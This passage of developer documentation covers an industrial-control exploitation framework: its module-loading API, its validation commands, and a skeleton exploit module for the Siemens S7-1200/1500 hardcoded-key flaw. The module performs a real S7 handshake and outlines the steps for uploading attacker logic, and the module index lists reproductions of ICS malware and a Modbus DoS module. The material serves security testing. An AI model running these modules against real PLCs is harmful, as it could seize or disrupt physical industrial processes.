# (the original __info__ key is deleted)
```

This is why `get_info()` builds the key dynamically from the class name: `"_{name}__info__".format(name=cls.__name__)`.

---

## Discovery API

### `import_exploit()`

**File:** `industrialxpl/core/exploit/utils.py`

Imports a module by its full Python dotted path and returns the first class found with name `Exploit`, `Scanner`, or `Assessment` (in that priority order).

**Signature:**
```python
def import_exploit(path: str) -> type
```

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `path` | `str` | Full Python import path including `industrialxpl.modules.` prefix |

**Return value:** The uninstantiated class (`type`). Call it with `()` to create an instance.

**Raises:** `IXFException` if:
- The path cannot be imported (`ImportError` — module file not found or has syntax errors).
- The module does not define any of `Exploit`, `Scanner`, or `Assessment` classes.

**Usage:**
```python
from industrialxpl.core.exploit.utils import import_exploit

# Load a module class by its full dotted path
ExploitClass = import_exploit(
    "industrialxpl.modules.cve.siemens.cve_2021_22681_s7_1200_hardcoded_key"
)

# Instantiate it
module = ExploitClass()

# Configure options programmatically
module.target = "192.168.1.100"
module.port = 102
module.simulate = True

# Use get_info() to access metadata
info = module.get_info()
print(info["name"])    # CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key
print(info["impact"])  # CRITICAL
print(info["cvss"])    # 9.8

# Run the check probe
reachable = module.check()
print("Reachable:", reachable)

# Run the exploit (simulate mode — no packets sent)
module.run()
```

**From slash notation to import path:**
```python
from industrialxpl.core.exploit.utils import import_exploit, pythonize_path

# Convert shell slash notation to importable path
slash_path = "cve/siemens/cve_2021_22681_s7_1200_hardcoded_key"
dot_path = pythonize_path(slash_path)
# dot_path = "cve.siemens.cve_2021_22681_s7_1200_hardcoded_key"

full_path = "industrialxpl.modules." + dot_path
ExploitClass = import_exploit(full_path)
```

---

### `index_modules()`

**File:** `industrialxpl/core/exploit/utils.py`

Walks the `industrialxpl/modules/` directory tree and returns a sorted list of all importable module paths (relative to `industrialxpl.modules.`).

**Signature:**
```python
def index_modules(modules_directory: str = MODULES_DIR) -> list[str]
```

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `modules_directory` | `str` | `industrialxpl/modules/` | Directory to walk |

**Return value:** A sorted `list[str]` of dotted module paths, each relative to `industrialxpl.modules.`. Example entries:
```python
[
    "assessment.iec62443.zone_conduit_audit",
    "assessment.ir.iacs_ir_playbook",
    "assessment.mitre_ics.coverage_report",
    "assessment.mitre_ics.full_mitre_sweep",
    "assessment.mitre_ics.t0801_monitor_process_state",
    "creds.siemens.s7_default_creds",
    "cve.malware.crashoverride_industroyer",
    "cve.malware.frostygoop_modbus_heating",
    "cve.siemens.cve_2021_22681_s7_1200_hardcoded_key",
    "exploits.protocols.modbus.modbus_fc90_dos",
    "scanners.ics.modbus_detect",
    ...
]
```

**Exclusions:** Directories listed in `DISABLED_DOMAINS` are skipped entirely:
```python
DISABLED_DOMAINS = {"__pycache__", "_native"}
```

This means `cve/malware/_native/` (compiled malware code) is never returned by `index_modules()`.

**Filtering examples:**
```python
from industrialxpl.core.exploit.utils import index_modules

all_modules = index_modules()

# All modules that target Siemens products
siemens = [m for m in all_modules if "siemens" in m]

# All MITRE ATT&CK technique modules
mitre = [m for m in all_modules if m.startswith("assessment.mitre_ics.t")]

# All scanner modules
scanners = [m for m in all_modules if m.startswith("scanners.")]

# All CVE exploit modules
cve_mods = [m for m in all_modules if m.startswith("cve.")]

# Modules related to Modbus
modbus = [m for m in all_modules if "modbus" in m]

print(f"Total modules: {len(all_modules)}")
print(f"MITRE ICS modules: {len(mitre)}")
print(f"Scanner modules: {len(scanners)}")
```

---

## Module Validation Command

After writing a new module, verify it loads correctly and passes import validation before using it in the shell.

**Quick import test (single module):**
```bash
cd D:\Projetos-SafeLabs\submodules\OT\IndustrialXPL-Forge
python -c "
from industrialxpl.core.exploit.utils import import_exploit
cls = import_exploit('industrialxpl.modules.cve.siemens.cve_2021_22681_s7_1200_hardcoded_key')
obj = cls()
info = obj.get_info()
print('[OK]', info['name'])
print('     Impact:', info['impact'])
print('     CVE:   ', info['cve'])
"
```

Expected output:
```
[OK] CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Crypto Key
     Impact: CRITICAL
     CVE:    CVE-2021-22681
```

**Full module tree validation:**
```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit

mods = index_modules()
errors = []
warnings = []

for m in mods:
    try:
        cls = import_exploit('industrialxpl.modules.' + m)
        obj = cls()
        info = obj.get_info()
        if not info:
            warnings.append((m, 'empty __info__'))
        elif 'name' not in info:
            warnings.append((m, 'missing name key in __info__'))
    except Exception as e:
        errors.append((m, str(e)))

print(f'Scanned: {len(mods)} modules')
print(f'Errors:  {len(errors)}')
print(f'Warnings:{len(warnings)}')

if errors:
    print()
    print('ERRORS:')
    for m, e in errors:
        print(f'  [ERR] {m}')
        print(f'        {e}')

if warnings:
    print()
    print('WARNINGS:')
    for m, w in warnings:
        print(f'  [WRN] {m}: {w}')

if not errors and not warnings:
    print('All modules loaded and validated successfully.')
"
```

Expected output (healthy tree):
```
Scanned: 87 modules
Errors:  0
Warnings:0
All modules loaded and validated successfully.
```

Output when a module has errors:
```
Scanned: 88 modules
Errors:  1
Warnings:0

ERRORS:
  [ERR] cve.siemens.my_new_module
        Cannot import 'industrialxpl.modules.cve.siemens.my_new_module':
        No module named 'struct2'
```

**Validate a module's options with the shell:**
```
ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key

ixf (CVE-2021-22681 S7-1200) > show options

  Module Options (cve/siemens/cve_2021_22681_s7_1200_hardcoded_key)
  ─────────────────────────────────────────────────────────────────────────
  Name          Current     Required  Description
  ────          ───────     ────────  ───────────
  target                    yes       Target device IP or hostname
  port          102         yes       S7comm port (default: 102)
  slot          2           no        PLC rack/slot number
  timeout       5           no        Connection timeout (seconds)
  simulate      True        yes       Simulate mode (default: True)
  destructive   False       yes       Enable live exploitation

ixf (CVE-2021-22681 S7-1200) > show info

  Module: cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  ─────────────────────────────────────────────────────────────────────────
  Name:        CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key
  Description: The S7-1200 and S7-1500 PLC families use a static,
               hardcoded symmetric encryption key to protect firmware
               updates and PLC logic. An attacker who recovers the key
               (via advisory disclosure) can sign and upload arbitrary
               firmware, achieving full PLC compromise.
  CVE:         CVE-2021-22681
  CVSS:        9.8 (Critical)
  Impact:      CRITICAL
  Techniques:  T0821 (Modify Controller Tasking), T0866 (Exploitation
               of Remote Services)
  Tactics:     Lateral Movement, Inhibit Response Function
```

---

## Complete Module Example

A complete production-quality module that demonstrates all patterns:

```python
"""CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Symmetric Key.

The Siemens SIMATIC S7-1200 and S7-1500 PLC families use a static,
hardcoded symmetric encryption key to protect PLC logic and firmware
updates. This key was extracted and publicly disclosed. An attacker
with network access to port 102 (S7comm) can exploit this to upload
arbitrary PLC logic, effectively overwriting the industrial control
program with attacker-controlled code.

Affected versions:
  S7-1200 firmware < 4.4.0
  S7-1500 firmware < 2.9.7

References:
  CISA ICS-ADVISORY ICSA-21-131-03
  https://nvd.nist.gov/vuln/detail/CVE-2021-22681
"""

import socket
import struct
from typing import Optional

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptIP,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)
from industrialxpl.core.exploit.exploit import Protocol


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key",
        "description":      (
            "The Siemens S7-1200/1500 PLC families use a static hardcoded "
            "symmetric key to authenticate and encrypt PLC logic uploads. "
            "An attacker can use this key to sign and upload arbitrary ladder "
            "logic, completely replacing the production control program."
        ),
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://www.cisa.gov/ics-advisories/icsa-21-131-03",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-22681",
        ),
        "devices":          (
            "Siemens SIMATIC S7-1200 CPU (all variants) firmware < 4.4.0",
            "Siemens SIMATIC S7-1500 CPU (all variants) firmware < 2.9.7",
        ),
        "impact":           "CRITICAL",
        "exploit_type":     "Cryptographic Key Disclosure / PLC Logic Overwrite",
        "source_poc":       "CISA ICS-ADVISORY ICSA-21-131-03",
        "cve":              "CVE-2021-22681",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0821", "T0866"],
        "mitre_tactics":    ["Lateral Movement", "Inhibit Response Function"],
        "destructive_description": (
            "Uploads attacker-controlled PLC logic to target using hardcoded key"
        ),
    }

    target_protocol = Protocol.S7

    target  = OptIP("",   "Target Siemens PLC IP or hostname")
    port    = OptPort(102, "S7comm TSAP port (default: 102)")
    slot    = OptInteger(2, "PLC CPU slot number", min_value=0, max_value=31)
    timeout = OptInteger(5, "Connection timeout (seconds)",
                         min_value=1, max_value=60, advanced=True)

    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live PLC logic overwrite")

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            cotp_cr = bytes.fromhex(
                "0300001611e00000001400c1020100c2020102c0010a"
            )
            sock.sendall(cotp_cr)
            resp = sock.recv(32)
            sock.close()
            return len(resp) > 5 and resp[0] == 0x03 and resp[5] == 0xD0
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error(
                "Set 'target' first. Example: set target 192.168.1.100"
            )
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key\n\n"
                    "Step 1: TCP connect to {}:{} (S7comm / TSAP)\n"
                    "Step 2: TPKT + COTP Connection Request (CR PDU)\n"
                    "Step 3: S7comm Setup Communication\n"
                    "Step 4: Authenticate using hardcoded symmetric key "
                    "(disclosed in ICSA-21-131-03)\n"
                    "Step 5: Download attacker-controlled STL/ladder program "
                    "to PLC CPU slot {}\n"
                    "Step 6: Initiate cold restart — PLC runs attacker logic\n"
                    "Physical Impact: Complete loss of control over "
                    "the industrial process managed by this PLC"
                ).format(self.target, self.port, self.slot),
                payload_hex=(
                    "03 00 00 16 11 E0 00 00 00 14 00 "
                    "C1 02 01 00 C2 02 01 02 C0 01 0A"
                ),
                payload_human=(
                    "TPKT/COTP CR followed by S7comm PDU type 0x72 "
                    "(firmware update) with hardcoded key authentication"
                ),
                mitre_techniques=["T0821", "T0866"],
            )
            return

        # Live path
        print_status(
            "[CVE-2021-22681] Connecting to {}:{} slot {}...".format(
                self.target, self.port, self.slot
            )
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            cotp_cr = bytes.fromhex(
                "0300001611e00000001400c1020100c2020102c0010a"
            )
            sock.sendall(cotp_cr)
            resp = sock.recv(32)

            if not (len(resp) > 5 and resp[0] == 0x03 and resp[5] == 0xD0):
                print_error("COTP handshake failed — target may not be an S7 device.")
                sock.close()
                return

            print_success("[CVE-2021-22681] COTP connection established.")
            print_info("[CVE-2021-22681] Implement S7comm key auth and logic upload here.")
            sock.close()

        except ConnectionRefusedError:
            print_error("Connection refused on port {}.".format(self.port))
        except socket.timeout:
            print_error("Timed out after {}s.".format(self.timeout))
        except Exception as exc:
            print_error("Error: {}".format(exc))
```

---

*Previous: [Shell Reference](03-shell-reference.md) | Next: [SafeMode / DestructiveMode](05-safemode-destructivemode.md)*
